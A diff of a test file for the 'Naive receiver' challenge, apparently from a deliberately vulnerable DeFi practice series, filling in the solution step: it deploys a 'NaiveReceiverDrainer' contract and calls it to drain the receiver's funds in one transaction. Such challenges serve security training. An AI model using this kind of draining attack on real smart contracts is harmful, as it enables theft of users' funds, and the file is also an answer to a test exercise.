@@ -37,7 +37,10 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Use the naive receiver drainer contract to perform the drain in one transaction
+        const naiveReceiverDrainerFactory = await ethers.getContractFactory('NaiveReceiverDrainer', deployer);
+        const naiveReceiverDrainer = await naiveReceiverDrainerFactory.deploy(receiver.address, pool.address);
+        await naiveReceiverDrainer.drainNaiveReceiver();
     });
 
     after(async function () {
